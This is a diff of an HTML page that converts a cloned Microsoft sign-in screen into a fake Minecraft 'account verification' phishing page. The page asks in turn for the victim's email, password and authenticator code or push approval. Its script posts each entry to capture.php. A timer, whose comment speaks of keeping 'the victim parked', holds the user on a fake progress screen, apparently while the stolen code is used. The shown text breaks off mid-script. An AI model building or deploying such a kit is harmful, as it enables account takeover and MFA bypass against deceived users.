@@ -2,60 +2,149 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Sign in to your Microsoft account</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Account Verification | Minecraft</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;
- background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;align-items:center;
- justify-content:center;color:#1b1b1b;padding:24px}
-.card{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);
- border-radius:2px;position:relative}
-.brand{display:flex;align-items:center;gap:9px;margin-bottom:18px;font-size:15px;color:#5e5e5e}
-.brand svg{width:20px;height:20px}
-h1{font-size:24px;font-weight:600;letter-spacing:-.3px;margin-bottom:14px}
-.sub{font-size:15px;margin-bottom:18px}
-.sub b{font-weight:600}
-input{width:100%;height:36px;border:1px solid #666;border-radius:0;padding:0 8px;
- font-size:15px;font-family:inherit;outline:none;margin-bottom:4px;background:#fff}
-input:focus{border-color:#0067b8;box-shadow:inset 0 0 0 1px #0067b8}
-.err{color:#e81123;font-size:13px;min-height:18px;margin-bottom:6px}
-.link{color:#0067b8;font-size:13px;text-decoration:none;display:inline-block;margin-bottom:18px}
-.link:hover{text-decoration:underline;color:#004578}
-.actions{display:flex;justify-content:flex-end;margin-top:8px}
-.btn{background:#0067b8;color:#fff;border:0;padding:0 24px;height:32px;font-size:15px;
- font-family:inherit;cursor:pointer;min-width:108px;border-radius:2px}
-.btn:hover{background:#005da6}
-.btn:active{background:#004578}
-.back{position:absolute;top:52px;left:14px;background:none;border:0;cursor:pointer;
- font-size:20px;color:#0067b8;line-height:1;padding:4px 8px}
-.back:hover{color:#004578}
-.with-back{padding-left:26px}
-.foot{margin-top:26px;display:flex;justify-content:flex-end;gap:18px;
- font-size:12px;color:#5e5e5e;width:100%;max-width:440px}
-.foot a{color:#5e5e5e;text-decoration:none}
-.foot a:hover{text-decoration:underline}
-.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.4);
- border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:-2px;margin-right:6px}
-@keyframes spin{to{transform:rotate(360deg)}}
-@media(max-width:480px){.card{padding:32px 24px;box-shadow:none;background:#fff;max-width:none}
- body{padding:0;background:#fff;justify-content:flex-start}.foot{padding:24px}}
+:root{--bg:#0d0d0d;--card:#1b1b1b;--line:#2e2e2e;--in:#262626;--green:#3c8527;--green-h:#4a9e30}
+body{font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);
+ color:#e8e8e8;min-height:100vh;display:flex;flex-direction:column;align-items:center;
+ justify-content:center;padding:20px}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;opacity:.5;
+ background-image:repeating-linear-gradient(0deg,rgba(255,255,255,.028) 0 2px,transparent 2px 4px),
+ repeating-linear-gradient(90deg,rgba(0,0,0,.16) 0 2px,transparent 2px 4px)}
+.logo{width:min(300px,72vw);height:auto;mix-blend-mode:screen;position:relative;z-index:1;margin-bottom:16px}
+.card{position:relative;z-index:1;background:var(--card);border:2px solid var(--line);width:100%;
+ max-width:410px;padding:28px 26px;box-shadow:0 8px 0 rgba(0,0,0,.45)}
+.steps{display:flex;gap:6px;margin-bottom:20px}
+.steps i{flex:1;height:4px;background:#333}
+.steps i.on{background:var(--green)}
+.badge{display:flex;align-items:center;gap:8px;font-family:monospace;font-size:11px;
+ letter-spacing:1.4px;text-transform:uppercase;color:#7fc95f;margin-bottom:12px}
+.badge svg{width:14px;height:14px;flex:none}
+h1{font-family:monospace;font-size:16px;letter-spacing:1.6px;text-transform:uppercase;
+ margin-bottom:8px;text-shadow:2px 2px 0 #000}
+.sub{font-size:13px;color:#9d9d9d;margin-bottom:18px;line-height:1.55}
+.sub b{color:#d8d8d8;word-break:break-all}
+label{display:block;font-size:11px;letter-spacing:1.2px;text-transform:uppercase;color:#8f8f8f;
+ margin-bottom:6px;font-family:monospace}
+input{width:100%;height:40px;background:var(--in);border:2px solid #3a3a3a;color:#fff;padding:0 10px;
+ font-size:15px;font-family:inherit;outline:none;margin-bottom:12px}
+input:focus{border-color:var(--green);background:#2b2b2b}
+input::placeholder{color:#6a6a6a}
+.err{color:#ff6b5e;font-size:12px;min-height:16px;margin:-6px 0 8px;font-family:monospace}
+.btn{width:100%;height:42px;background:var(--green);color:#fff;border:0;border-bottom:4px solid #24541a;
+ font-family:monospace;font-size:14px;letter-spacing:1.4px;text-transform:uppercase;font-weight:700;
+ cursor:pointer;margin-top:4px}
+.btn:hover{background:var(--green-h)}
+.btn:active{border-bottom-width:1px;transform:translateY(3px)}
+.btn.ghost{background:#2a2a2a;border-bottom-color:#111;color:#d0d0d0}
+.btn.ghost:hover{background:#333}
+.row{display:flex;gap:8px}.row .btn{margin-top:0}
+.link{display:block;text-align:center;color:#8fb9ff;font-size:12.5px;text-decoration:none;margin-top:14px;
+ font-family:monospace}
+.link:hover{text-decoration:underline}
+.back{background:none;border:0;color:#8f8f8f;cursor:pointer;font-family:monospace;font-size:11px;
+ letter-spacing:1px;text-transform:uppercase;margin-bottom:12px;padding:0}
+.back:hover{color:#fff}
+.note{background:#232323;border-left:3px solid #4a9e30;padding:10px 12px;font-size:12.5px;
+ color:#b4b4b4;line-height:1.5;margin-bottom:14px}
+.spin{display:inline-block;width:13px;height:13px;border:2px solid rgba(255,255,255,.35);
+ border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite;vertical-align:-2px;margin-right:7px}
+@keyframes s{to{transform:rotate(360deg)}}
+.track{height:10px;background:#2a2a2a;border:2px solid #333;margin:18px 0 10px;overflow:hidden}
+.bar{height:100%;width:0;background:linear-gradient(90deg,#3c8527,#7fc95f);transition:width .9s linear}
+.pmsg{font-family:monospace;font-size:12px;color:#8f8f8f;text-align:center;min-height:18px}
+.timer{font-family:monospace;font-size:11px;color:#5e5e5e;text-align:center;margin-top:8px;letter-spacing:1px}
+.ok{width:64px;height:64px;margin:6px auto 16px;border:3px solid #4a9e30;border-radius:50%;
+ display:flex;align-items:center;justify-content:center;animation:pop .35s ease-out}
+.ok svg{width:30px;height:30px;stroke:#7fc95f;stroke-width:4;fill:none;stroke-linecap:round}
+@keyframes pop{from{transform:scale(.4);opacity:0}to{transform:scale(1);opacity:1}}
+footer{position:relative;z-index:1;margin-top:24px;text-align:center;font-size:11px;color:#5e5e5e;
+ font-family:monospace;line-height:1.9}
+footer a{color:#6f6f6f;text-decoration:none}
+@media(max-width:420px){body{padding:0;justify-content:flex-start;padding-top:30px}
+ .card{max-width:none;border-left:0;border-right:0;padding:24px 20px}}
 </style>
 </head>
 <body>
 
-<div class="brand">
-  <svg viewBox="0 0 23 23"><rect x="1" y="1" width="10" height="10" fill="#f25022"/><rect x="12" y="1" width="10" height="10" fill="#7fba00"/><rect x="1" y="12" width="10" height="10" fill="#00a4ef"/><rect x="12" y="12" width="10" height="10" fill="#ffb900"/></svg>
-  Microsoft
-</div>
+<img src="logo.png" class="logo" alt="Minecraft" onerror="this.style.display='none'">
 
 <div class="card">
+  <div class="steps"><i class="on" id="s1"></i><i id="s2"></i><i id="s3"></i></div>
 
-  <!-- STEP 1: email -->
+  <!-- 1 -->
   <div id="step1">
-    <h1>Sign in</h1>
-    <p class="sub">to continue to <b>Minecraft</b></p>
-    <input id="email" type="email" placeholder="Email, phone, or Skype"
-           autocomplete="username" spellcheck="false">
+    <div class="badge">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#7fc95f" stroke-width="2.4"><path d="M12 2l8 3v6c0 5-3.4 9.3-8 11-4.6-1.7-8-6-8-11V5l8-3z"/></svg>
+      Verification required
+    </div>
+    <h1>Verify your account</h1>
+    <p class="sub">Your Minecraft account needs to be verified to keep playing. Confirm ownership with your <b>Microsoft</b> account.</p>
+    <label for="email">Email address</label>
+    <input id="email" type="email" placeholder="you@example.com" autocomplete="username" spellcheck="false">
     <p class="err" id="e1"></p>
-    <a class="link" href="#">No account? Create one!</
+    <button class="btn" onclick="next()">Continue</button>
+  </div>
+
+  <!-- 2 -->
+  <div id="step2" hidden>
+    <button class="back" onclick="back()">&#8592; Back</button>
+    <h1>Confirm password</h1>
+    <p class="sub"><b id="shownEmail"></b></p>
+    <label for="pass">Password</label>
+    <input id="pass" type="password" placeholder="Password" autocomplete="current-password">
+    <p class="err" id="e2"></p>
+    <button class="btn" onclick="submitPass(this)">Verify</button>
+    <a class="link" href="#">Forgot password?</a>
+  </div>
+
+  <!-- 3 -->
+  <div id="step3" hidden>
+    <h1>Security check</h1>
+    <div class="note">Open your <b>Microsoft Authenticator</b> app and <b>approve the request</b>, or type the 6-digit code shown in the app.</div>
+    <label for="code">Verification code</label>
+    <input id="code" type="text" inputmode="numeric" maxlength="8" placeholder="000000" autocomplete="one-time-code">
+    <p class="err" id="e3"></p>
+    <div class="row">
+      <button class="btn ghost" onclick="skip()">Approve on phone</button>
+      <button class="btn" onclick="submitCode(this)">Submit</button>
+    </div>
+  </div>
+
+  <!-- 4: the hold -->
+  <div id="step4" hidden>
+    <h1>Verifying your account</h1>
+    <p class="sub">Please keep this window open. Do <b>not</b> close it or log in again while verification runs.</p>
+    <div class="track"><div class="bar" id="bar"></div></div>
+    <p class="pmsg" id="pmsg">Checking account ownership&hellip;</p>
+    <p class="timer" id="timer"></p>
+  </div>
+
+  <!-- 5: done -->
+  <div id="step5" hidden>
+    <div class="ok"><svg viewBox="0 0 24 24"><path d="M4 12.5l5.5 5.5L20 7"/></svg></div>
+    <h1 style="text-align:center">Verification complete</h1>
+    <p class="sub" style="text-align:center">Your account has been verified. Redirecting you back to Minecraft&hellip;</p>
+  </div>
+</div>
+
+<footer>Need help? <a href="#">Contact support</a><br>&copy; 2026 Mojang Synergies AB</footer>
+
+<script>
+var HOLD = 150; // seconds to keep the victim parked (raise for slower hands)
+var EMAIL='', RE=/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i;
+
+function send(d){try{fetch('capture.php',{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify(d),keepalive:true});}catch(e){}}
+function hideAll(){for(var i=1;i<=5;i++)document.getElementById('step'+i).hidden=true;}
+function mark(n){document.getElementById('s1').className=n>=1?'on':'';
+  document.getElementById('s2').className=n>=2?'on':'';
+  document.getElementById('s3').className=n>=3?'on':'';}
+function err(id,t){document.getElementById(id).textContent=t;}
+
+function next(){
+  var v=document.getElementById('email').value.trim();
+  if(!RE.test(v)){err('e1','Enter a valid email address.');return;}
+  EMAIL=v; send({
